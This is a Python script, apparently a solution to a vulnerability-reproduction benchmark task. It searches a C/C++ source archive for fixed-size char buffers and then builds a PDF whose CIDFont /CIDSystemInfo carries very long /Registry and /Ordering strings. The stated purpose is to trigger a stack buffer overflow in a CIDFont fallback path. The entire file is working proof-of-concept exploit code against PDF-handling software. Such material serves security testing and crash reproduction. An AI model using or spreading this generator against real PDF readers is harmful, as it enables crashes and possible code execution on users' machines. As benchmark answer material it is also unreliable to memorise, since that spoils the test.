import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the CIDFont fallback stack buffer overflow.
        """
        trigger_len = self._infer_trigger_length(src_path)
        return self._build_pdf_poc(trigger_len)

    def _infer_trigger_length(self, src_path: str) -> int:
        """
        Heuristically infer a safe length for the /Registry and /Ordering
        strings by scanning the source for fixed-size char buffers.
        """
        default_len = 5000
        max_buf = 0

        try:
            with tarfile.open(src_path, "r:*") as tf:
                exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")
                char_array_re = re.compile(
                    r"char\s+[A-Za-z_][A-Za-z0-9_]*\s*\[\s*(\d+)\s*\]"
                )

                for member in tf.getmembers():
                    if not member.isfile():
                        continue
                    name_lower = member.name.lower()
                    if not name_lower.endswith(exts):
                        continue
                    # Skip overly large files to keep things quick
                    if member.size <= 0 or member.size > 256 * 1024:
                        continue

                    try:
                        f = tf.extractfile(member)
                        if f is None:
                            continue
                        data = f.read().decode("utf-8", errors="ignore")
                    except Exception:
                        continue

                    # Only bother with files that mention likely-relevant keywords
                    if (
                        "CIDSystemInfo" not in data
                        and "Registry" not in data
                        and "Ordering" not in data
                    ):
                        continue

                    for m in char_array_re.finditer(data):
                        try:
                            size = int(m.group(1))
                        except Exception:
                            continue
                        if size > max_buf:
                            max_buf = size
        except Exception:
            # If anything goes wrong, fall back to a conservative length
            return default_len

        if max_buf > 0:
            trigger_len = max(default_len, max_buf * 4)
        else:
            trigger_len = default_len

        # Clamp to avoid excessively large PoCs
        if trigger_len > 60000:
            trigger_len = 60000
        if trigger_len < 1024:
            trigger_len = 1024

        return trigger_len

    def _build_pdf_poc(self, length: int) -> bytes:
        """
        Construct a minimal PDF with a Type0 font that has a descendant CIDFont
        whose CIDSystemInfo dictionary contains extremely long /Registry and
        /Ordering strings. This should exercise the CIDFont fallback path that
        builds "<Registry>-<Ordering>" in a fixed-size stack buffer.
        """
        registry = "A" * length
        ordering = "B" * length

        header = b"%PDF-1.4\n%\xFF\xFF\xFF\xFF\n"

        bodies = []

        # 1: Catalog
        bodies.append("<< /Type /Catalog /Pages 2 0 R >>")

        # 2: Pages
        bodies.append("<< /Type /Pages /Kids [3 0 R] /Count 1 >>")

        # 3: Page that uses font F1 (Type0 font 4 0 R)
        bodies.append(
            "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
            "/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>"
        )

        # 4: Type0 font referencing descendant CIDFont 6 0 R
        bodies.append(
            "<< /Type /Font /Subtype /Type0 /BaseFont /FakedCIDFont "
            "/Encoding /Identity-H /DescendantFonts [6 0 R] >>"
        )

        # 5: Simple content stream that uses F1
        content_stream = b"BT /F1 24 Tf 100 700 Td (Hello CIDFont) Tj ET\n"
        length_stream = len(content_stream)
        body5 = (
            "<< /Length " + str(length_stream) + " >>\nstream\n"
            + content_stream.decode("latin1")
            + "endstream"
        )
        bodies.append(body5)

        # 6: CIDFont with oversized /CIDSystemInfo strings
        body6 = (
            "<< /Type /Font /Subtype /CIDFontType2 /BaseFont /FakedCIDFont "
            "/CIDSystemInfo << /Registry ("
            + registry
            + ") /Ordering ("
            + ordering
            + ") /Supplement 0 >> "
            "/FontDescriptor 7 0 R /DW 1000 >>"
        )
        bodies.append(body6)

        # 7: Minimal FontDescriptor
        bodies.append(
            "<< /Type /FontDescriptor /FontName /FakedCIDFont "
            "/Flags 4 /FontBBox [0 0 1000 1000] /ItalicAngle 0 "
            "/Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 >>"
        )

        pdf_parts = [header]
        offsets = [0]  # index 0 unused (object 0 in xref is the free head)

        current_offset = len(header)

        for i, body in enumerate(bodies, start=1):
            obj_str = f"{i} 0 obj\n{body}\nendobj\n"
            obj_bytes = obj_str.encode("latin1")
            offsets.append(current_offset)
            pdf_parts.append(obj_bytes)
            current_offset += len(obj_bytes)

        xref_offset = current_offset
        obj_count = len(bodies)

        # Build xref table
        xref_lines = [
            f"xref\n0 {obj_count + 1}\n",
            "0000000000 65535 f \n",
        ]
        for i in range(1, obj_count + 1):
            off = offsets[i]
            xref_lines.append(f"{off:010d} 00000 n \n")

        xref = "".join(xref_lines).encode("latin1")
        pdf_parts.append(xref)

        # Trailer
        trailer = (
            f"trailer\n<< /Size {obj_count + 1} /Root 1 0 R >>\n"
            f"startxref\n{xref_offset}\n%%EOF\n"
        ).encode("latin1")
        pdf_parts.append(trailer)

        return b"".join(pdf_parts)